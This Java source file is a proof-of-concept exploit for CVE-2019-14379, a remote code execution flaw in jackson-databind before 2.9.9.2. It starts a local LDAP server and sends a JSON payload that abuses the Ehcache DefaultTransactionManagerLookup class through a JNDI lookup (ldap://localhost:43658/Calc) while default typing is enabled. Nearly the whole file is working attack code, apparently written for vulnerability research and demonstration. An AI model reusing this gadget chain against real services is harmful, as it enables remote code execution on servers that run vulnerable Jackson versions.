package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import com.threedr3am.bug.common.server.RmiServer;
import java.io.IOException;

/**
 * CVE-2019-14379
 * jackson-databind RCE < 2.9.9.2
 * @author threedr3am
 */
public class EhcacheJndi {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {

    String json = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\"," +
        "{\"properties\":{\"jndiName\":\"ldap://localhost:43658/Calc\"}}]";
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);

  }
}
